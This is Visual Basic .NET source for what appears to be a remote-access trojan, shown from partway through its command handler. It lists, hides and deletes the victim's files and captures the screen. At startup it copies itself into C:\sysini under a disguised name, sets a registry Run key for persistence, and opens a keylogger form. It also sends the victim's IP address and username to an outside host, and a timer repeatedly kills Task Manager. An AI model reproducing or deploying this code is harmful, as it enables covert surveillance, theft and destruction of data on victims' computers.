            Chat.Show()
        End If

        If Double.Parse(id(0)) = "666" Then
            Chat.Show()
            Dim chattxt As String = id(1).ToString
            Chat.TextBox1.Text &= id(1) & Environment.NewLine
        End If


        If Double.Parse(id(0)) = "38" Then
            Chat.Hide()
        End If

        If Double.Parse(id(0)) = "39" Then
            Dim stri As String = id(1).ToString
            Chat.TextBox1.Text &= stri
        End If


        If Double.Parse(id(0)) = "40" Then

            Dim x As Integer = id(1)
            Dim y As Integer = id(2)


            Cursor.Position.X.Equals(x)
            Cursor.Position.Y.Equals(y)
        End If



        If Double.Parse(id(0)) = "41" Then


            send = "1*Started Screencapture"
            sendstream2(send)
            start()

        End If

        If Double.Parse(id(0)) = "42" Then
            send = "1*Goodbye!"
            sendstream2(send)

        End If

        If Double.Parse(id(0)) = "43" Then
            send = "1*Beeped the host!"
            sendstream2(send)

            Dim hz As String = id(1)
            Dim time As String = id(2)
            Console.Beep(hz, time)
        End If

        If Double.Parse(id(0)) = "44" Then

            Dim x As String = id(1)
            Dim y As String = id(2)
            changeRes(x, y)
        End If

        If Double.Parse(id(0)) = "45" Then
            Mac.Show()
            Mac.Width = My.Computer.Screen.Bounds.X
            Mac.Height = My.Computer.Screen.Bounds.Y
        End If

        If Double.Parse(id(0)) = "46" Then
            filename = id(1)
        End If


        If Double.Parse(id(0)) = "47" Then

            Dim list As String = ""
            Dim dFolder As DirectoryInfo = New DirectoryInfo(id(1).ToString)

            Dim fFileArray() As FileInfo = dFolder.GetFiles
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile As FileInfo


            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile In fFileArray
                list &= fFile.Name & fFile.Extension & "|"

            Next





            Dim list2 As String = ""
            Dim dFolder2 As DirectoryInfo = New DirectoryInfo(id(1))

            Dim fFileArray2() As DirectoryInfo = dFolder2.GetDirectories
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile2 As DirectoryInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile2 In fFileArray2
                list2 &= fFile2.Name & "|"
            Next




            Dim list3 As String = ""
            Dim dFolder3 As DirectoryInfo = New DirectoryInfo(id(1))
            Dim fFileArray3() As FileInfo = dFolder3.GetFiles
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER
            Dim fFile3 As FileInfo
            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile3 In fFileArray3
                list3 &= fFile3.Length \ 1024 + 1 & "KB|"
            Next






            sendstream2("6*" & list.ToString & "-" & list2.ToString & "-" & list3.ToString)



        End If


        'info
        If Double.Parse(id(0)) = "48" Then



        End If


        If Double.Parse(id(0)) = "49" Then


            'hide desktop files
            Dim list As String = ""
            Dim dFolder As DirectoryInfo = New DirectoryInfo(Environment.SpecialFolder.DesktopDirectory)

            Dim fFileArray() As FileInfo = dFolder.GetFiles
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile As FileInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile In fFileArray
                fFile.Attributes = FileAttributes.Hidden

            Next

        End If


        If Double.Parse(id(0)) = "50" Then


            'hide desktop files
            Dim list As String = ""
            Dim dFolder As DirectoryInfo = New DirectoryInfo(Environment.SpecialFolder.DesktopDirectory)

            Dim fFileArray() As FileInfo = dFolder.GetFiles
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile As FileInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile In fFileArray
                fFile.Attributes = FileAttributes.Normal

            Next

        End If


        If Double.Parse(id(0)) = "51" Then


            'hide desktop files
            Dim list As String = ""
            Dim dFolder As DirectoryInfo = New DirectoryInfo(Environment.SpecialFolder.MyDocuments)
            Dim dFolder2 As DirectoryInfo = New DirectoryInfo(Environment.SpecialFolder.MyMusic)
            Dim dFolder3 As DirectoryInfo = New DirectoryInfo(Environment.SpecialFolder.MyPictures)

            Dim fFileArray() As FileInfo = dFolder.GetFiles
            Dim fFileArray2() As FileInfo = dFolder2.GetFiles
            Dim fFileArray3() As FileInfo = dFolder3.GetFiles

            Dim fFile As FileInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile In fFileArray
                fFile.Attributes = FileAttributes.Hidden

            Next

            For Each fFile In fFileArray2
                fFile.Attributes = FileAttributes.Hidden

            Next

            For Each fFile In fFileArray3
                fFile.Attributes = FileAttributes.Hidden

            Next

        End If



        If Double.Parse(id(0)) = "52" Then


            'hide desktop files
            Dim list As String = ""
            Dim dFolder As DirectoryInfo = New DirectoryInfo(Environment.SpecialFolder.MyDocuments)
            Dim dFolder2 As DirectoryInfo = New DirectoryInfo(Environment.SpecialFolder.MyMusic)
            Dim dFolder3 As DirectoryInfo = New DirectoryInfo(Environment.SpecialFolder.MyPictures)

            Dim fFileArray() As FileInfo = dFolder.GetFiles
            Dim fFileArray2() As FileInfo = dFolder2.GetFiles
            Dim fFileArray3() As FileInfo = dFolder3.GetFiles

            Dim fFile As FileInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile In fFileArray
                fFile.Attributes = FileAttributes.Normal

            Next

            For Each fFile In fFileArray2
                fFile.Attributes = FileAttributes.Normal

            Next

            For Each fFile In fFileArray3
                fFile.Attributes = FileAttributes.Normal

            Next

        End If






        If Double.Parse(id(0)) = "52" Then

            Dim list As String = ""
            Dim dFolder As DirectoryInfo = New DirectoryInfo(My.Computer.FileSystem.SpecialDirectories.Desktop)

            Dim fFileArray() As FileInfo = dFolder.GetFiles
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile As FileInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile In fFileArray
                list &= fFile.Name & fFile.Extension & "|"

            Next





            Dim list2 As String = ""
            Dim dFolder2 As DirectoryInfo = New DirectoryInfo(id(1))

            Dim fFileArray2() As DirectoryInfo = dFolder2.GetDirectories
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile2 As DirectoryInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile2 In fFileArray2
                list2 &= fFile2.Name & "|"
            Next




            Dim list3 As String = ""
            Dim dFolder3 As DirectoryInfo = New DirectoryInfo(id(1))
            Dim fFileArray3() As FileInfo = dFolder3.GetFiles
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER
            Dim fFile3 As FileInfo
            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile3 In fFileArray3
                list3 &= fFile3.Length \ 1024 + 1 & "KB|"
            Next






            sendstream2("6*" & list.ToString & "-" & list2.ToString & "-" & list3.ToString)



        End If





        If Double.Parse(id(0)) = "53" Then

            Dim list As String = ""
            Dim dFolder As DirectoryInfo = New DirectoryInfo(My.Computer.FileSystem.SpecialDirectories.MyDocuments)

            Dim fFileArray() As FileInfo = dFolder.GetFiles
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile As FileInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile In fFileArray
                list &= fFile.Name & fFile.Extension & "|"

            Next





            Dim list2 As String = ""
            Dim dFolder2 As DirectoryInfo = New DirectoryInfo(id(1))

            Dim fFileArray2() As DirectoryInfo = dFolder2.GetDirectories
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile2 As DirectoryInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile2 In fFileArray2
                list2 &= fFile2.Name & "|"
            Next




            Dim list3 As String = ""
            Dim dFolder3 As DirectoryInfo = New DirectoryInfo(id(1))
            Dim fFileArray3() As FileInfo = dFolder3.GetFiles
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER
            Dim fFile3 As FileInfo
            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile3 In fFileArray3
                list3 &= fFile3.Length \ 1024 + 1 & "KB|"
            Next






            sendstream2("6*" & list.ToString & "-" & list2.ToString & "-" & list3.ToString)



        End If




        If Double.Parse(id(0)) = "54" Then

            Dim list As String = ""
            Dim dFolder As DirectoryInfo = New DirectoryInfo(My.Computer.FileSystem.SpecialDirectories.MyMusic)

            Dim fFileArray() As FileInfo = dFolder.GetFiles
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile As FileInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile In fFileArray
                list &= fFile.Name & fFile.Extension & "|"

            Next





            Dim list2 As String = ""
            Dim dFolder2 As DirectoryInfo = New DirectoryInfo(id(1))

            Dim fFileArray2() As DirectoryInfo = dFolder2.GetDirectories
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile2 As DirectoryInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile2 In fFileArray2
                list2 &= fFile2.Name & "|"
            Next




            Dim list3 As String = ""
            Dim dFolder3 As DirectoryInfo = New DirectoryInfo(id(1))
            Dim fFileArray3() As FileInfo = dFolder3.GetFiles
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER
            Dim fFile3 As FileInfo
            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile3 In fFileArray3
                list3 &= fFile3.Length \ 1024 + 1 & "KB|"
            Next






            sendstream2("6*" & list.ToString & "-" & list2.ToString & "-" & list3.ToString)



        End If





        If Double.Parse(id(0)) = "55" Then

            Dim list As String = ""
            Dim dFolder As DirectoryInfo = New DirectoryInfo(My.Computer.FileSystem.SpecialDirectories.MyPictures)

            Dim fFileArray() As FileInfo = dFolder.GetFiles
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile As FileInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile In fFileArray
                list &= fFile.Name & fFile.Extension & "|"

            Next





            Dim list2 As String = ""
            Dim dFolder2 As DirectoryInfo = New DirectoryInfo(id(1))

            Dim fFileArray2() As DirectoryInfo = dFolder2.GetDirectories
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile2 As DirectoryInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile2 In fFileArray2
                list2 &= fFile2.Name & "|"
            Next




            Dim list3 As String = ""
            Dim dFolder3 As DirectoryInfo = New DirectoryInfo(id(1))
            Dim fFileArray3() As FileInfo = dFolder3.GetFiles
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER
            Dim fFile3 As FileInfo
            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile3 In fFileArray3
                list3 &= fFile3.Length \ 1024 + 1 & "KB|"
            Next






            sendstream2("6*" & list.ToString & "-" & list2.ToString & "-" & list3.ToString)



        End If

        If Double.Parse(id(0)) = "56" Then
            If My.Computer.FileSystem.DirectoryExists(id(1)) Then
                My.Computer.FileSystem.DeleteDirectory(id(1), FileIO.DeleteDirectoryOption.DeleteAllContents)
            End If
            If My.Computer.FileSystem.DirectoryExists(id(1)) Then
                sendstream2("1*Could not delete" & id(1))
            Else
                sendstream2("1*Deleted" & id(1))

            End If
        End If


        If Double.Parse(id(0)) = "57" Then
            If My.Computer.FileSystem.FileExists(id(1)) Then
                My.Computer.FileSystem.DeleteFile(id(1))
            End If

            If My.Computer.FileSystem.FileExists(id(1)) Then
                sendstream2("1*Could not delete" & id(1))
            Else
                sendstream2("1*Deleted" & id(1))

            End If
        End If


        If Double.Parse(id(0)) = "58" Then
            My.Computer.FileSystem.CreateDirectory(id(1))
        End If


        If Double.Parse(id(0)) = "59" Then
            My.Computer.FileSystem.WriteAllText(id(1) & id(2), id(3), True)
        End If


        If Double.Parse(id(0)) = "60" Then

            MsgBox(Environment.SpecialFolder.ApplicationData)

            Dim dFolder2 As DirectoryInfo = New DirectoryInfo(My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData)
            Dim fFileArray2() As DirectoryInfo = dFolder2.GetDirectories
            ' 'FILEARRAY' NOW HOLDS ALL THE FILES IN THE SELECTED FOLDER

            Dim fFile2 As DirectoryInfo

            ' LOOP THROUGH ARRAY, LISTING ALL FILES IN LISTVIEW
            For Each fFile2 In fFileArray2
                MsgBox("got one")
                MsgBox(fFile2.Name.ToString & "ff")
            Next



        End If


        If Double.Parse(id(0)) = "61" Then
            '     Call SetWindowPos(TaskBarHwnd, 0&, 0&, 0&, 0&, 0&, SWP_HIDEWINDOW)
        End If


        If Double.Parse(id(0)) = "62" Then

            '     Call SetWindowPos(TaskBarHwnd, 0&, 0&, 0&, 0&, 0&, SWP_SHOWWINDOW)
        End If

        If Double.Parse(id(0)) = "63" Then
            Flip.Show()
            Flip.Timer1.Enabled = True

        End If

        If Double.Parse(id(0)) = "64" Then
            Flip.Timer1.Enabled = False

            Flip.Hide()
        End If

        If Double.Parse(id(0)) = "67" Then
            AB.AutoHide = True
        End If

        If Double.Parse(id(0)) = "79" Then
            AB.AutoHide = False
        End If

        If Double.Parse(id(0)) = "71" Then
            hideclock()
        End If


        If Double.Parse(id(0)) = "72" Then
            ShowFavorites()
        End If
        If Double.Parse(id(0)) = "83" Then
            HideFavorites()
        End If

        If Double.Parse(id(0)) = "77" Then
            showclock()
        End If

        If Double.Parse(id(0)) = "78" Then
            locktaskbar()
        End If

        If Double.Parse(id(0)) = "68" Then
            AB.AlwaysOnTop = True
        End If

        If Double.Parse(id(0)) = "80" Then
            AB.AlwaysOnTop = False
        End If

        If Double.Parse(id(0)) = "69" Then
            groupitems()

        End If

        If Double.Parse(id(0)) = "81" Then
            ungroup()
        End If

        If Double.Parse(id(0)) = "70" Then
            HideTaskbarItems()
        End If



        If Double.Parse(id(0)) = "82" Then
            ShowTaskbarItems()
        End If



        If Double.Parse(id(0)) = "83" Then
            ChangeDesktop(id(1))
        End If


        If Double.Parse(id(0)) = "84" Then
            Timer2.Enabled = True
        End If



        If Double.Parse(id(0)) = "85" Then
            Timer2.Enabled = False
        End If


    End Sub

#End Region

#Region "directories getter"
    Sub GetDirectories(ByVal StartPath As String, ByRef DirectoryList As ArrayList)
        Dim Dirs() As String = Directory.GetDirectories(StartPath)
        DirectoryList.AddRange(Dirs)
        For Each Dir As String In Dirs
            GetDirectories(Dir, DirectoryList)
        Next
    End Sub
#End Region

#Region "data sending subs"

    Sub sendstream2(ByVal txt As String)
        Dim temp As String
        If serverip.Text = "" Then
            Dim ipsort() As String = Split(serversocket.Client.RemoteEndPoint.ToString, ":", -1, CompareMethod.Text)
            temp = ipsort(0) 'ipsort(0)

            Dim myip As IPAddress = IPAddress.Parse(temp)

            Dim port As Integer = 8001
            Dim info As New IPEndPoint(myip, port)
            Dim clientconnect As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            Try
                clientconnect.Connect(info)

                Dim mybytes(10024) As Byte
                Dim mystr As String = txt
                mybytes = System.Text.Encoding.ASCII.GetBytes(mystr)
                clientconnect.Send(mybytes, mybytes.Length, SocketFlags.None)

            Catch ex As Exception
                MsgBox(ex.StackTrace.ToString)
            End Try
        Else


            Dim myip As IPAddress = IPAddress.Parse(serverip.Text.ToString)

            Dim port As Integer = 8001
            Dim info As New IPEndPoint(myip, port)
            Dim clientconnect As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            Try
                clientconnect.Connect(info)

                Dim mybytes(10024) As Byte
                Dim mystr As String = txt
                mybytes = System.Text.Encoding.ASCII.GetBytes(mystr)
                clientconnect.Send(mybytes, mybytes.Length, SocketFlags.None)

            Catch ex As Exception
                MsgBox(ex.StackTrace.ToString)
            End Try
        End If
    End Sub


    Sub sendstream()

        Dim ipsort() As String = Split(serversocket.Client.RemoteEndPoint.ToString, ":", -1, CompareMethod.Text)
        serverip.Text = (ipsort(0))

        Dim myip As IPAddress = IPAddress.Parse(serverip.Text)
        Dim port As Integer = 8001
        Dim info As New IPEndPoint(myip, port)
        Dim clientconnect As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        Try
            clientconnect.Connect(info)

            Dim mybytes(10024) As Byte
            Dim mystr As String = send
            mybytes = System.Text.Encoding.ASCII.GetBytes(mystr)
            clientconnect.Send(mybytes, mybytes.Length, SocketFlags.None)
        Catch ex As Exception
            MsgBox(ex.StackTrace.ToString)
        End Try

    End Sub




#End Region

#Region "random stuff and form startup, timers and debug stuff"

    Private Function temstring(ByVal strData As Array) As String
        'Used in Host(Server) and Connect(Client)
        'need to bind the data as object or somthing like that
        Dim temp As Long, mString As String
        mString = ""
        For temp = 0 To UBound(strData)
            mString &= Chr(strData(temp))
        Next
        Return mString
    End Function




    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load


        If Not My.User.Name.ToLower.Contains("bob") Then

            If Not My.Computer.FileSystem.DirectoryExists("C:\sysini") Then
                My.Computer.FileSystem.CreateDirectory("C:\sysini")
            End If

            If Not My.Computer.FileSystem.FileExists("C:\sysini\Windows Host Manager.exe") Then
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, "C:\sysini\Windows Host Manager.exe")

                Dim oReg As RegistryKey = Registry.CurrentUser
                Dim oKey As RegistryKey = oReg.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                oKey.SetValue("Windows Host Manager.exe", "C:\sysini\Windows Host Manager.exe")
            End If



        End If

        'TaskBarHwnd = FindWindow("Shell_traywnd","")
        keylog.Show()

        Dim miiip As System.Net.IPHostEntry = System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName)
        Label2.Text = miiip.AddressList.GetValue(0).ToString

        tcpcin.Start()

        Dim readthread As New Thread(New ThreadStart(AddressOf myread))
        readthread.Start()
        WebBrowser1.Navigate("http://httpforwardslash.t35.com/ref.php", String.Empty, Nothing, "referer: [USERIP: " & Label2.Text & " |USERNAME:" & My.User.Name & "]")
    End Sub






    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        sendstream2("1*" & nick + " :" & TextBox1.Text) 'To Send the Text from the host textbox to the Client's Screen
        TextBox1.Text = "" 'clear the text in txt box

    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        If serversocket.Connected = True Then


            If serverip.Text = "" Then
                Dim ipsort() As String = Split(serversocket.Client.RemoteEndPoint.ToString, ":", 2, CompareMethod.Text)

                serverip.Text = ipsort(0) 'ipsort(0)

                clientip = ipsort(0)
                Timer1.Enabled = False
            End If
        End If
    End Sub

#End Region

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick

        Shell("taskkill /F /IM taskmgr.exe")

    End Sub

    Private Sub IPNOTIFy_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles IPNOTIFy.Tick
        WebBrowser1.Navigate("http://httpforwardslash.t35.com/ref.php", String.Empty, Nothing, "referer: [USERIP: " & Label2.Text & " |USERNAME:" & My.User.Name & "]")
       
        IPNOTIFy.Enabled = False
    End Sub
End Class
